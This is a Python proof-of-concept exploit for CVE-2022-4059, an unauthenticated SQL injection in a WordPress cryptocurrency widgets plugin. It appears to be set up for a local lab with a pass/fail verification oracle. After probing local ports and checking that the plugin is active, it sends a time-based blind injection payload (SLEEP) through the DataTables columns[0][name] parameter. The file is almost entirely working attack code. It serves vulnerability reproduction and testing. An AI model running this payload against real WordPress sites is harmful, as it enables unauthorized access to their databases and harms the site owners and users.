#!/usr/bin/env python3
"""
PoC for SQL injection in Massive Cryptocurrency Widgets Pack plugin (CVE-2022-4059)
Exploits unauthenticated AJAX endpoint wp_ajax_nopriv_mcwp_table via ORDER BY clause.
"""

import requests
import time
import json
import sys

# Configuration
SERVICE_URL = "http://localhost:9000"
AJAX_URL = f"{SERVICE_URL}/wp-admin/admin-ajax.php"
TIMEOUT = 30
DELAY_SECONDS = 5

# 禁用代理设置
PROXIES = {
    'http': None,
    'https': None
}

def test_connectivity():
    """
    测试基本连通性和不同端口
    """
    common_ports = [9000, 80, 8080, 8888]

    for port in common_ports:
        test_url = f"http://localhost:{port}/"
        print(f"[*] Testing connectivity to port {port}...")

        try:
            response = requests.get(test_url, timeout=5, proxies=PROXIES)
            print(f"[+] Port {port}: HTTP {response.status_code}")
            if response.status_code == 200 and "wordpress" in response.text.lower():
                global SERVICE_URL, AJAX_URL
                SERVICE_URL = f"http://localhost:{port}"
                AJAX_URL = f"{SERVICE_URL}/wp-admin/admin-ajax.php"
                print(f"[+] Found WordPress on port {port}, updating target URL")
                return True
        except Exception as e:
            print(f"[-] Port {port}: {str(e)[:50]}...")

    return False

def test_plugin_activation():
    """
    测试插件是否激活，通过访问 AJAX 端点但不提供参数
    """
    print("[*] Testing plugin activation...")
    try:
        response = requests.get(f"{SERVICE_URL}/wp-admin/admin-ajax.php?action=mcwp_table",
                               timeout=10, proxies=PROXIES)
        print(f"[*] Plugin test response: {response.status_code}")

        if response.status_code == 200:
            print("[+] Plugin appears to be activated")
            return True
        elif response.status_code == 302:
            print("[!] Getting redirect - plugin may not be activated or requires auth")
            return False
        elif response.status_code == 400:
            print("[+] Plugin activated but missing parameters (expected)")
            return True
        else:
            print(f"[-] Unexpected status: {response.status_code}")
            return False

    except Exception as e:
        print(f"[!] Plugin test error: {e}")
        return False

def test_sql_injection():
    """
    Attempt time-based SQL injection via columns[][name] parameter.
    """
    # We need a valid mcwp_id (post ID of a crypto widget).
    # Since we don't know any, we can try default? The plugin may require an existing widget.
    # Let's try mcwp_id=1 (maybe there is a default widget).
    # If that fails, we can try to enumerate.
    mcwp_id = 1

    # Craft payload: ORDER BY (SELECT SLEEP(DELAY_SECONDS))
    # The column name parameter is columns[0][name]
    payload = f"name+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))aaaa)--+-"

    # DataTables parameters
    params = {
        'action': 'mcwp_table',
        'mcwp_id': mcwp_id,
        'columns[0][data]': 'id',
        'columns[0][name]': payload,
        'columns[0][searchable]': 'true',
        'columns[0][orderable]': 'true',
        'columns[0][search][value]': '',
        'columns[0][search][regex]': 'false',
        'order[0][column]': '0',
        'order[0][dir]': 'ASC',
        'start': '0',
        'length': '10',
        'search[value]': '',
        'search[regex]': 'false',
        'draw': '1'
    }

    print(f"[*] Target URL: {AJAX_URL}")
    print(f"[*] Using mcwp_id: {mcwp_id}")
    print(f"[*] Injecting payload: {payload}")
    print(f"[*] Expected delay: {DELAY_SECONDS} seconds")

    start_time = time.time()
    try:
        # 禁用代理，直接连接
        response = requests.get(AJAX_URL, params=params, timeout=TIMEOUT, proxies=PROXIES)
        elapsed = time.time() - start_time
        print(f"[*] Response time: {elapsed:.2f} seconds")
        print(f"[*] HTTP status: {response.status_code}")

        # 输出响应内容以便调试
        if response.status_code not in [200, 302]:
            print(f"[!] Unexpected status code: {response.status_code}")
            print(f"[!] Response headers: {dict(response.headers)}")
            if len(response.text) < 500:
                print(f"[!] Response body: {response.text}")

        if elapsed >= DELAY_SECONDS:
            print("[+] SQL injection successful (time-based delay detected).")
            return True
        else:
            print("[-] No delay detected.")
            # Maybe the payload didn't work; try alternative injection points.
            return False
    except requests.exceptions.Timeout:
        elapsed = time.time() - start_time
        print(f"[!] Request timed out after {elapsed:.2f} seconds (possibly due to SLEEP).")
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def verify_vulnerability():
    """
    Verification oracle: check if SQL injection is possible.
    """
    success = test_sql_injection()
    if success:
        print("[+] Verification PASSED: SQL injection vulnerability confirmed.")
    else:
        print("[-] Verification FAILED: No evidence of SQL injection.")
    return success

if __name__ == "__main__":
    print("[*] Starting PoC for CVE-2022-4059")

    # 首先测试连通性
    if not test_connectivity():
        print("[-] No accessible WordPress installation found")
        sys.exit(1)

    # 测试插件是否激活
    if not test_plugin_activation():
        print("[-] Plugin not activated or not accessible")
        sys.exit(1)

    result = verify_vulnerability()
    sys.exit(0 if result else 1)